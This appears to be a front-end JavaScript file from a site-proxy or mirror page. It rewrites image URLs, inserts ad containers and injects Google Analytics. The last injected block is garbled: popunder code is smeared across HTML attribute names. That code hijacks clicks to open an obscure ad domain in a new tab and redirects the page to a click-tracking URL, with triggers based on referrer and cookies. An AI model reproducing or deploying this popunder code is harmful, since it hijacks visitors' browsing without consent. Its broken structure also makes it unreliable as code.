function isUrl(data){
  try{
    new URL(data);
    return true;
  }catch(e){
    return false;
  };
};

function urlParse(data){
  var m = data.match(/^(([^:\/?#]+:)?(?:\/\/((?:([^\/?#:]*):([^\/?#:]*)@)?([^\/?#:]*)(?::([^\/?#:]*))?)))?([^?#]*)(\?[^#]*)?(#.*)?$/),
        r = {
            hash: m[10] || "",
            host: m[3] || "",
            hostname: m[6] || "",
            href: m[0] || "",
            origin: m[1] || "",
            pathname: m[8] || (m[1] ? "/" : ""),
            port: m[7] || "",
            protocol: m[2] || "",
            search: m[9] || "",
            username: m[4] || "",
            password: m[5] || "" 
        };
    if (r.protocol.length == 2) {
        r.protocol = "file:///" + r.protocol.toUpperCase();
        r.origin = r.protocol + "//" + r.host;
    }
    r.href = r.origin + r.pathname + r.search + r.hash;
    return r;
};

function maketextnumber(n) {
    for (var r = ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9"], e = n, t = new Array, a = 0; a <= e - 1; a++) {
        t[a] = r[parseInt(Math.random() * r.length)];
        t = t;
    }
    return t.join("");
}

(function(){injectScript([{"attr":[{"name":"async","value":""},{"name":"src","value":"https://www.googletagmanager.com/gtag/js?id=UA-170237250-1"}],"tag":"script","inner":""},{"attr":[],"tag":"script","inner":"\n  window.dataLayer = window.dataLayer || [];\n  function gtag(){dataLayer.push(arguments);}\n  gtag('js', new Date());\n\n  gtag('config', 'UA-170237250-1');\n"}],{"target":"body"});function injectScript(e,t){let n=t.target;for(let t of e){let e=t.tag,r=t.inner,o=document.createElement(e);o.innerHTML=r;let c=t.attr;for(let e of c)o.setAttribute(e.name,e.value);document.querySelector(n)&&document.querySelector(n).append(o)}}})();

function removeImg(data){
  let targetImg=document.querySelector(`[pick-image="`+data+`"]`);
  if(targetImg!=null){
    targetImg.remove();
  };
};
document.querySelectorAll("img").forEach(function(a){
  try{
    let dataUrl=a.getAttribute("src");
    let uriOrigin=window.location.origin;
    if(dataUrl!=null&&dataUrl.indexOf("//")==0){
      dataUrl=dataUrl.replace("//","https://");
    };
    if(isUrl(dataUrl)){
    }else{
      if(window.location.href.indexOf("/host-")>0){
        let urlReal=window.location.href.split("/host-")[1];
        urlReal=urlReal.replace("https-","https://").replace("http-","http://");
        urlReal=urlParse(urlReal).origin+dataUrl;
        urlReal=uriOrigin+urlReal.replace("https://","/host-https-").replace("http://","/host-http-");
        a.setAttribute("src",urlReal);
      };
    };
  }catch(e){

  };
});
let dbAds=[
  {
    "target-selector":[
      ".container",
      "#container",
      ".content",
      ".pa15.bgwhite"
    ],
    "position":"out-top", //out-top, out-bottom, in-top, in-bottom
    "data" :`
    <!-- Iklan Header -->
    `,
    "style":`
      width: 90%;
      margin: auto;
      margin-bottom: 10px;
      margin-top: 10px;
    `
  }
];

dbAds.forEach(function(a){
  let createElDom=document.createElement("div");
  createElDom.setAttribute("style",a["style"]);
  createElDom.innerHTML=a["data"];
  let dataScript=[];
  createElDom.querySelectorAll("script").forEach(function(b){
    let createElCostom=document.createElement("script");
    createElCostom.innerHTML=b.innerHTML;
    dataScript.push(createElCostom);
    b.remove();
  });
  a["target-selector"].forEach(function(b){
    let targetEl=document.querySelector(b);
    if(targetEl){
      if(a["position"]=="out-bottom"){
        targetEl.parentNode.insertBefore(createElDom,targetEl.nextSibling);
      }else if(a["position"]=="out-top"){
        targetEl.parentNode.insertBefore(createElDom,targetEl.nextSibling);
        createElDom.after(targetEl);
      }else if(a["position"]=="in-top"){

      }else if(a["position"]=="in-top"){
        
      };
      dataScript.forEach(function(b){
        createElDom.append(b); 
      });
    }else{
      console.log("target "+a["target-selector"]+" tidak ditemukan"); 
    };
  });
});


let elImg=document.querySelectorAll("img");
elImg.forEach(function(a){
  a.setAttribute("style","max-width:100%");
  let classImg=a.getAttribute("class");
  let getSrcSet=a.getAttribute("srcset");
  if(classImg==null==false){
    a.classList.remove("lazyload");
  };
  if(getSrcSet==null==false){
    getSrcSet=getSrcSet.split(",");
    if(getSrcSet.length>1){
      a.setAttribute("src",getSrcSet);
    };
  };
});

let dataLazy=document.querySelectorAll(".lazy-image.lazy-image-udf");
dataLazy.forEach(function(a){
  let dataHref=a.getAttribute("data-src");
  if(dataHref){
    let targetLazy=a.querySelector(".loadingPlaceholder");
    let targetDiv=a.querySelector(".lazy-image__loadingPlaceholder")
    if(targetLazy){
      targetLazy.setAttribute("src",dataHref);
      targetDiv.setAttribute("class","show")
    };
  };
});
(function(){injectScript([{"attr":[],"tag":"script","inner":"window.close();"},{"attr":[{"name":"in","value":""},{"name":"arguments[e])o[t]","value":"arguments[e][t];return"},{"name":"o},getcookie:function(e){var","value":""},{"name":"t","value":"document.cookie.match(new"},{"name":"regexp(e+\"","value":"[^;]+\",\"i\"));return"},{"name":"t?decodeuricomponent(t[0].split(\"","value":")[1]):null},setCookie:function(e,t,o,n){if(null===o||"},{"name":"undefined\"","value":"=typeof"},{"name":"o)o","value":""},{"name":";else{var","value":""},{"name":"i;\"number\"","value":"=typeof"},{"name":"o?(i","value":"new"},{"name":"date,i.settime(i.gettime()+60*o*1e3)):i","value":"o,o=\";"},{"name":"expires","value":"+i.toUTCString()}document.cookie=e+"},{"name":"=\"+escape(t)+o+\";","value":""},{"name":"path","value":"+(n||"},{"name":"\")}};t.prototype","value":"{defaultWindowOptions:{width:e.screen.width,height:e.screen.height,left:0,top:0,location:1,toolbar:1,status:1,menubar:1,scrollbars:1,resizable:1},defaultPopOptions:{cookieExpires:null,cookiePath:\"/\",newTab:!0,blur:!0,blurByAlert:!1,chromeDelay:500,smart:!1,beforeOpen:function(){},afterOpen:function(){}},__chromeNewWindowOptions:{scrollbars:0},__construct:function(e,t){this.url=e,this.index=o++,this.name=s+\"_\"+this.index,this.executed=!1,this.setOptions(t),this.register()},register:function(){if"},{"name":"(this.isexecuted())","value":""},{"name":"return;","value":""},{"name":"var","value":""},{"name":"t,o,s","value":"this,a=[],l=\"click\",h=function(hj){hj.preventDefault(),n=(new"},{"name":"date).gettime(),s.setexecuted(),s.options.beforeopen.call(void","value":""},{"name":"0,this),s.options.newtab?c.chrome&&c.version","value":""}],"tag":"arguments.length;e++)for(t","inner":"30&amp;&amp;s.options.blur?(e.open(\"javascript:window.focus()\",\"_self\",\"\"),u.simulateClick(s.url),t=null):(t=r.window.open(s.url,\"_blank\"),setTimeout(function(){!i&amp;&amp;s.options.blurByAlert&amp;&amp;(i=!0,alert())},3)):t=r.window.open(s.url,this.url,s.getParams()),s.options.blur&amp;&amp;u.blur(t),s.options.afterOpen.call(void 0,this);for(o in a)u.detachEvent(l,h,a[o])},p=function(e){if(s.isExecuted())return void u.detachEvent(\"mousemove\",p);try{e.originalTarget&amp;&amp;\"undefined\"==typeof e.originalTarget[s.name]&amp;&amp;(e.originalTarget[s.name]=!0,u.attachEvent(l,h,e.originalTarget),a.push(e.originalTarget))}catch(t){}};this.options.smart?u.attachEvent(\"mousemove\",p):(u.attachEvent(l,h,e),a.push(e),u.attachEvent(l,h,document),a.push(document))},shouldExecute:function(){return c.chrome&amp;&amp;n&amp;&amp;n+this.options.chromeDelay&gt;(new Date).getTime()?!1:!this.isExecuted()},isExecuted:function(){return this.executed||!!u.getCookie(this.name)},setExecuted:function(){this.executed=!0,u.setCookie(this.name,1,this.options.cookieExpires,this.options.cookiePath)},setOptions:function(e){if(this.options=u.mergeObject(this.defaultWindowOptions,this.defaultPopOptions,e||{}),!this.options.newTab&amp;&amp;c.chrome)for(var t in this.__chromeNewWindowOptions)this.options[t]=this.__chromeNewWindowOptions[t]},getParams:function(){var e,t=\"\";for(e in this.options)\"undefined\"!=typeof this.defaultWindowOptions[e]&amp;&amp;(t+=(t?\",\":\"\")+e+\"=\"+this.options[e]);return t}},t.make=function(e,t){return new this(e,t)},e.dpu=t}(window);\n\nwindow['pu'] = {\"id\":4936,\"user_id\":482,\"name\":\"Pop_001\",\"urls\":\"https:\\/\\/n49seircas7r.com\\/m7sehkc90?key=0be5c3adbc47d391b77a8af0d58c6bc7\",\"frequency\":1,\"rt_enable\":true,\"referer_se\":true,\"referer_sm\":true,\"referer_empty\":true,\"referer_not_empty\":true,\"ct_enable\":0,\"country_af\":0,\"country_wsb\":0,\"country_al\":0,\"country_dz\":0,\"country_as\":0,\"country_ad\":0,\"country_ao\":0,\"country_ai\":0,\"country_aq\":0,\"country_ag\":0,\"country_ar\":0,\"country_am\":0,\"country_aw\":0,\"country_atc\":0,\"country_au\":0,\"country_at\":0,\"country_az\":0,\"country_bs\":0,\"country_bh\":0,\"country_kab\":0,\"country_bjn\":0,\"country_bd\":0,\"country_bb\":0,\"country_by\":0,\"country_be\":0,\"country_bz\":0,\"country_bj\":0,\"country_bm\":0,\"country_bt\":0,\"country_bo\":0,\"country_ba\":0,\"country_bw\":0,\"country_bv\":0,\"country_br\":0,\"country_io\":0,\"country_vg\":0,\"country_bn\":0,\"country_bg\":0,\"country_bf\":0,\"country_bi\":0,\"country_kh\":0,\"country_cm\":0,\"country_ca\":0,\"country_cv\":0,\"country_bq\":0,\"country_ky\":0,\"country_cf\":0,\"country_td\":0,\"country_cl\":0,\"country_cn\":0,\"country_cx\":0,\"country_clp\":0,\"country_cc\":0,\"country_co\":0,\"country_km\":0,\"country_ck\":0,\"country_csi\":0,\"country_cr\":0,\"country_hr\":0,\"country_cu\":0,\"country_cw\":0,\"country_cy\":0,\"country_cnm\":0,\"country_cz\":0,\"country_cd\":0,\"country_dk\":0,\"country_esb\":0,\"country_dj\":0,\"country_dm\":0,\"country_do\":0,\"country_ec\":0,\"country_eg\":0,\"country_sv\":0,\"country_gq\":0,\"country_er\":0,\"country_ee\":0,\"country_et\":0,\"country_eu\":0,\"country_fk\":0,\"country_fo\":0,\"country_fj\":0,\"country_fi\":0,\"country_fr\":0,\"country_gf\":0,\"country_pf\":0,\"country_tf\":0,\"country_ga\":0,\"country_gm\":0,\"country_ge\":0,\"country_de\":0,\"country_gh\":0,\"country_gi\":0,\"country_gr\":0,\"country_gl\":0,\"country_gd\":0,\"country_gp\":0,\"country_gu\":0,\"country_gt\":0,\"country_gg\":0,\"country_gn\":0,\"country_gw\":0,\"country_gy\":0,\"country_ht\":0,\"country_hm\":0,\"country_hn\":0,\"country_hk\":0,\"country_hu\":0,\"country_is\":0,\"country_in\":0,\"country_ioa\":0,\"country_id\":0,\"country_ir\":0,\"country_iq\":0,\"country_ie\":0,\"country_im\":0,\"country_il\":0,\"country_it\":0,\"country_ci\":0,\"country_jm\":0,\"country_jp\":0,\"country_je\":0,\"country_jo\":0,\"country_kz\":0,\"country_ke\":0,\"country_ki\":0,\"country_xk\":0,\"country_kw\":0,\"country_kg\":0,\"country_la\":0,\"country_lv\":0,\"country_lb\":0,\"country_ls\":0,\"country_lr\":0,\"country_ly\":0,\"country_li\":0,\"country_lt\":0,\"country_lu\":0,\"country_mo\":0,\"country_mk\":0,\"country_mg\":0,\"country_mw\":0,\"country_my\":0,\"country_mv\":0,\"country_ml\":0,\"country_mt\":0,\"country_mh\":0,\"country_mq\":0,\"country_mr\":0,\"country_mu\":0,\"country_yt\":0,\"country_mx\":0,\"country_fm\":0,\"country_md\":0,\"country_mc\":0,\"country_mn\":0,\"country_me\":0,\"country_ms\":0,\"country_ma\":0,\"country_mz\":0,\"country_mm\":0,\"country_cyn\":0,\"country_na\":0,\"country_nr\":0,\"country_np\":0,\"country_nl\":0,\"country_nc\":0,\"country_nz\":0,\"country_ni\":0,\"country_ne\":0,\"country_ng\":0,\"country_nu\":0,\"country_nf\":0,\"country_kp\":0,\"country_mp\":0,\"country_no\":0,\"country_om\":0,\"country_pk\":0,\"country_pw\":0,\"country_ps\":0,\"country_pa\":0,\"country_pg\":0,\"country_py\":0,\"country_pe\":0,\"country_ph\":0,\"country_pn\":0,\"country_pl\":0,\"country_pt\":0,\"country_pr\":0,\"country_qa\":0,\"country_cg\":0,\"country_ro\":0,\"country_ru\":0,\"country_rw\":0,\"country_re\":0,\"country_bl\":0,\"country_sh\":0,\"country_kn\":0,\"country_lc\":0,\"country_mf\":0,\"country_pm\":0,\"country_vc\":0,\"country_ws\":0,\"country_sm\":0,\"country_sa\":0,\"country_scr\":0,\"country_sn\":0,\"country_rs\":0,\"country_ser\":0,\"country_sc\":0,\"country_kas\":0,\"country_sl\":0,\"country_sg\":0,\"country_sx\":0,\"country_sk\":0,\"country_si\":0,\"country_sb\":0,\"country_so\":0,\"country_sol\":0,\"country_za\":0,\"country_gs\":0,\"country_kr\":0,\"country_ss\":0,\"country_es\":0,\"country_pga\":0,\"country_lk\":0,\"country_sd\":0,\"country_sr\":0,\"country_sj\":0,\"country_sz\":0,\"country_se\":0,\"country_ch\":0,\"country_sy\":0,\"country_st\":0,\"country_tw\":0,\"country_tj\":0,\"country_tz\":0,\"country_th\":0,\"country_tl\":0,\"country_tg\":0,\"country_tk\":0,\"country_to\":0,\"country_tt\":0,\"country_tn\":0,\"country_tr\":0,\"country_tm\":0,\"country_tc\":0,\"country_tv\":0,\"country_usg\":0,\"country_ug\":0,\"country_ua\":0,\"country_ae\":0,\"country_gb\":0,\"country_us\":0,\"country_um\":0,\"country_vi\":0,\"country_uy\":0,\"country_uz\":0,\"country_vu\":0,\"country_va\":0,\"country_ve\":0,\"country_vn\":0,\"country_wf\":0,\"country_eh\":0,\"country_ye\":0,\"country_zm\":0,\"country_zw\":0,\"country_ax\":0,\"created_at\":\"2021-08-17 04:04:45\",\"updated_at\":\"2021-11-15 07:07:35\",\"floating_banner\":null,\"html_body\":null,\"arsae\":null,\"type\":\"popunder\",\"complete_floating_banner\":\"\",\"arsae_servers\":[],\"visitor_country\":\"ID\",\"first_tier\":false,\"is_bot\":false,\"target_url\":false};\nfunction referer_se()\n{\n\treturn str_contains(document.referrer.toLowerCase(), ['.google.', '.yahoo.', '.bing.', '.yandex.']);\n}\n\nfunction referer_sm()\n{\n\treturn str_contains(document.referrer.toLowerCase(), ['fb.com', 'facebook.com', 'twitter.com', 'pinterest.com', 'plus.google.']);\n}\n\nfunction referer_empty()\n{\n\tvar referer = document.referrer;\n\treturn (!referer || 0 === referer.length);\n}\n\nfunction referer_not_empty()\n{\n\treturn !referer_empty();\n}\n\nfunction str_contains(str, needles){\n\tvar contains = false;\n\n\tneedles.forEach(function(needle){\n\t\tif(str.indexOf(needle) != -1){\n\t\t\tcontains = true;\n\t\t}\n\t});\n\n\treturn contains;\n}\n\nfunction setInnerHTML(elm, html) {\n    elm.innerHTML = html;\n    Array.from(elm.querySelectorAll(\"script\")).forEach( oldScript =&gt; {\n        const newScript = document.createElement(\"script\");\n        Array.from(oldScript.attributes)\n        .forEach( attr =&gt; newScript.setAttribute(attr.name, attr.value) );\n        newScript.appendChild(document.createTextNode(oldScript.innerHTML));\n        oldScript.parentNode.replaceChild(newScript, oldScript);\n    });\n}\n\nfunction inject(location, pu_var)\n{\n    //Create the element using the createElement method.\n    var myDiv = document.createElement(\"div\");\n    document[location].appendChild(myDiv);\n\n    //Set its unique ID.\n    //myDiv.id = 'pop_' + window.pu.id + '_' + pu_var;\n\n    //Add your content to the DIV\n    setInnerHTML(myDiv, window.pu[pu_var]);\n}\n\nfunction create_pu()\n{\n    document.addEventListener('DOMContentLoaded', function () {\n        var target = window.location.href;\n\n        if(window.pu.arsae){\n            if(!str_contains(window.location.href.toLowerCase(), window.pu.arsae_servers)){\n                var arsae_servers = window.pu.arsae_servers;\n                var server = arsae_servers[Math.floor(Math.random()*arsae_servers.length)];\n                target = server + '/?arsae='+ encodeURIComponent(window.location.href) + '&amp;arsae_ref='+ encodeURIComponent(document.referrer);\n            }\n            else {\n                // don't run on arsae server\n                console.log(\"don't run on arsae server\");\n                return false;\n            }\n        }\n\n        var origin = 'http://pop.dojo.cc/click/4936';\n\n        if(window.pu.type === 'popup'){\n            var tmp_link = target;\n            target = origin;\n            origin = tmp_link;\n        }\n\n        console.log('pux init');\n\n        window.pux = dpu.make(target, {\n            newTab: true,\n            cookieExpires: 60 * 24 / 1,\n            afterOpen: function(pop) {\n                window.location.href = origin;\n            }\n        });\n\n        if(!window.pux.isExecuted() &amp;&amp; window.pu.complete_floating_banner){\n            inject('body', 'complete_floating_banner');\n        }\n        else{\n            console.log('pux executed');\n        }\n\n        inject('body', 'html_body');\n    });\n}\n\nif(pu.rt_enable){\n\tif( (pu.referer_se &amp;&amp; referer_se()) || (pu.referer_sm &amp;&amp; referer_sm()) || (pu.referer_empty &amp;&amp; referer_empty()) || (pu.referer_not_empty &amp;&amp; referer_not_empty())){\n\t\tcreate_pu();\n\t}\n}\nelse{\n\tcreate_pu();\n}"}],{"target":"body"});function injectScript(e,t){let n=t.target;for(let t of e){let e=t.tag,r=t.inner,o=document.createElement(e);o.innerHTML=r;let c=t.attr;for(let e of c)o.setAttribute(e.name,e.value);document.querySelector(n)&&document.querySelector(n).append(o)}}})();
